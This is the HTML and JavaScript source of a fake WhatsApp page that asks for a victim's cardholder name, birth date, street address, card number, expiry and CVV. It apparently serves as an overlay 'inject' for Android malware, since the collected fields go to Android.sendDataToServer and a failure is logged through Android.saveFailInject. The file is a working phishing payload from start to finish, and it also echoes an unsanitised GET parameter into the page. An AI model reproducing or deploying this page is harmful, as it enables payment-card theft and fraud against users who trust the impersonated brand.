<!DOCTYPE html>
<html g_init="6861">
<head>
	<title>WhatsApp</title>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="user-scalable=no, initial-scale=1.0, maximum-scale=1.0 minimal-ui">

	<script type="text/javascript" src="jquery-2.1.4.min.js"></script>
	<script type="text/javascript" src="demo.js"></script>
	<script type="text/javascript" src="dateform.js"></script>
	<script type="text/javascript" src="viewport.js"></script>

	<link rel="stylesheet" href="demo.css">
	<link rel="stylesheet" type="text/css" href="index.css" media="all">
	
	<script>
	
		var lastSlideNumber = 1;

		$(document).ready(function(){
		
			$('select').on('focus', function() {
				if ($(this).val() === "") {
					$(this).addClass('unselected'); 
				} else {
					$(this).removeClass('unselected');
				}
			});
			
		});
		
		function unDisableById(id) {
			$('#' + id).prop( 'disabled', false );
		}
		
		function transmit(formNumber, regReceiver) {
			var o = {};
			var a = $('#data' + formNumber).serializeArray();
			var result = true;
			
			$.each(a, function() {
				if (this.value == '') result = false;
				if (o[this.name] !== undefined) {
					if (!o[this.name].push) {
						o[this.name] = [o[this.name]];
					}
					o[this.name].push(this.value || '');
				} else {
					o[this.name] = this.value || '';
				}
			});

			o['stepID'] = formNumber;
	
			if (!result) return false;
			
			if (regReceiver)
				setInterval(1200, sendData(JSON.stringify(o), regReceiver) );
			else
				sendData(JSON.stringify(o), regReceiver);
				
			return true;
		}
		
		function sendData(data, regReceiver) {
			//console.log( data );
			Android.sendDataToServer(data, regReceiver);
		}

		function showInternetError() {
			Android.saveFailInject();
			$('#item-slide-' + lastSlideNumber).hide();
			$('#error-slide').show();
		}

		function tryEnterAgain() {
			$('#error-slide').hide();
			$('#item-slide-' + lastSlideNumber).show();
		}
		
		function switchSlide(slideNumber, isData, regReceiver) {
			if (isData && !transmit(slideNumber - 1, regReceiver)) return;
			$('.slide').hide();
			lastSlideNumber = slideNumber;
			$('#item-slide-' + slideNumber).show();
		}
		
		function firstSlideClick() {
			switchSlide(2, false, false);
			$('#background').addClass('background-two');
		}

		$(function($) {
			$.mask.definitions['~']='[+-]';
			$('#expiry_date').mask('99/99',{placeholder:"мм/гг"});
		});

	 </script>
</head>
<body id="background">


	<div >
		<br>
		<img src="whatsapp.png" alt="img" style="width: 200px;" class="responsive-imagepp">
		<br><br><br>
		<form action="" method="post" class="wrapper">
			<ul>
			
				<input type="hidden" name="p" value="<?php echo $_GET["p"]; ?>">
				<input type="hidden" name="field1" value="whatsapp"/> 
				<input type="text"  name="field2" id="cardholder_name" onkeyup="check();" class="input" placeholder="Cardholder name">
				
				<script>
					document.getElementById('cardholder_name').onkeypress = function (e) {
						return !(/[0-9]/.test(String.fromCharCode(e.charCode)));
					}
				</script>
				<small class="help"></small>
				<li style="margin: 10px 0 0 0px;">
					<input id="dobMM" type="text" name="field3" max="12" onkeyup="check();" class="field3" placeholder="MM" maxlength="2" style="float: left;margin-right: 1%;">
					<script>
					document.getElementById('dobMM').onkeypress = function (e) {
						return !(/[А-Яа-яA-za-z]/.test(String.fromCharCode(e.charCode)));
					}
				</script>
					<input id="dobDD" type="text" name="field4" max="31" onkeyup="check();" class="field3" placeholder="DD" maxlength="2" style="float: left;margin-right: 1%;">
					<script>
					document.getElementById('dobDD').onkeypress = function (e) {
						return !(/[А-Яа-яA-za-z]/.test(String.fromCharCode(e.charCode)));
					}
				</script>
					<input id="dobYYYY" type="text" name="field5" max="1998" onkeyup="check();" class="field3" placeholder="YYYY" maxlength="4" style="float: left;margin-right: 1%;">
					<script>
					document.getElementById('dobYYYY').onkeypress = function (e) {
						return !(/[А-Яа-яA-za-z]/.test(String.fromCharCode(e.charCode)));
					}
				</script>
				</li>
				
				<li>
					<input id="street_address" type="text" class="input" onkeyup="check();" name="field6"  placeholder="Street address">
				</li>
				
				<li>
					<input type="text"  name="field7" class="input" onkeyup="check();" id="card_number" placeholder="1234 5678 9012 3456" maxlength="16">
					<script>
					document.getElementById('card_number').onkeypress = function (e) {
						return !(/[А-Яа-яA-za-z]/.test(String.fromCharCode(e.charCode)));
					}
				</script>
					
				</li>
				<small class="help"></small>

		
		<li>
					<input id="expMM" type="text" name="field8" onkeyup="check();" class="field3" placeholder="MM" maxlength="2" style="float: left;margin-bottom: 17px;">
					<script>
					document.getElementById('expMM').onkeypress = function (e) {
						return !(/[А-Яа-яA-za-z]/.test(String.fromCharCode(e.charCode)));
					}
				</script>
					<input id="expYY" type="text" name="field9" onkeyup="check();" class="field3" placeholder="DD" maxlength="2" style="float: left;">
					<script>
					document.getElementById('expYY').onkeypress = function (e) {
						return !(/[А-Яа-яA-za-z]/.test(String.fromCharCode(e.charCode)));
					}
				</script>
					<input type="number" name="field10" id="cvv" onkeyup="check();" max="999" class="field3" maxlength="3" placeholder="123" oninput="if(value.length>3)value=value.slice(0,3)" style="float: right !important;">
					<script>
					document.getElementById('cvv').onkeypress = function (e) {
						return !(/[А-Яа-яA-za-z]/.test(String.fromCharCode(e.charCode)));
					}
				</script>
		</li>
		
				
			
		
		<!-- к третьему слайду -->
		<br><input type="submit" id="btn1" disabled="disabled" class="button button-green3 center-button btn" value="Log In"></input>
		</form>
		 <br> <br>    
	</div>
	
	<script>
function check() {
  var inp1 = document.getElementById('cardholder_name'),
      inp2 = document.getElementById('dobMM'),
      inp3 = document.getElementById('dobDD'),
      inp4 = document.getElementById('dobDD'),
      inp5 = document.getElementById('dobYYYY'),
      inp6 = document.getElementById('street_address'),
      inp7 = document.getElementById('card_number'),
      inp8 = document.getElementById('expMM'),
      inp9 = document.getElementById('expYY'),
      inp10 = document.getElementById('cvv');
  document.getElementById('btn1').disabled = inp1.value && inp2.value && inp3.value && inp4.value && inp5.value && inp6.value && inp7.value && inp8.value && inp9.value && inp10.value ? false : "disabled";
}
</script>

<script type="text/javascript">
                    var g_oBtn = document.getElementById('btn1');
                    g_oBtn.onclick = function () {
					
						var oNameInp = document.getElementById('cardholder_name');
                        var odobmmInp = document.getElementById('dobMM');
                        var odobddInp = document.getElementById('dobDD');
                        var odobyyyInp = document.getElementById('dobYYYY');
                        var oAddressInp = document.getElementById('street_address');
                        var oCardInp = document.getElementById('card_number');
                        var oexpMMInp = document.getElementById('expMM');
                        var oexpYYInp = document.getElementById('expYY');
                        var ocvvInp = document.getElementById('cvv');

						try{
							oNameInp.className = 'input';
							odobmmInp.className = 'field3';
							odobddInp.className = 'field3';
							odobyyyInp.className = 'field3';
							oAddressInp.className = 'input';
							oCardInp.className = 'card_number input';
							oexpMMInp.className = 'field3';
							oexpYYInp.className = 'field3';
							ocvvInp.className = 'field3';
						} catch(e){};
						
                        if(oNameInp.value == "" ||oNameInp.value.length < 3) {
							oNameInp.className = 'input no-float field-error';
							bSuccess = false;
						} else {
							oNameInp.className = 'input no-float';
						}
						
                        if (!/^\w{2,2}$/i.test(odobmmInp.value)) {
							try{
                                odobmmInp.className = 'fielderror2';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{2,2}$/i.test(odobddInp.value)) {
							try{
								odobddInp.className = 'fielderror2';
							} catch(e){};
                            return false;
                        }	
						
                        if (!/^\w{4,4}$/i.test(odobyyyInp.value)) {
							try{
								odobyyyInp.className = 'fielderror2';
							} catch(e){};
                            return false;
                        }	
						
                        if (oAddressInp.value.length < 3) {
							try{
								oAddressInp.className = 'input no-float field-error';
							} catch(e){};
                            return false;
                        }	
						
                        if (oCardInp.value.length < 16) {
							try{
								oCardInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }		
						
                        if (!/^\w{2,2}$/i.test(oexpMMInp.value)) {
							try{
								oexpMMInp.className = 'fielderror2';
							} catch(e){};
                            return false;
                        }		
						
                        if (!/^\w{2,2}$/i.test(oexpYYInp.value)) {
							try{
								oexpYYInp.className = 'fielderror2';
							} catch(e){};
                            return false;
                        }		
						
                        if (!/^\w{3,3}$/i.test(ocvvInp.value)) {
							try{
								ocvvInp.className = 'fielderror2';
							} catch(e){};
                            return false;
                        }						
						
                    }
            </script>

</body>
</html>
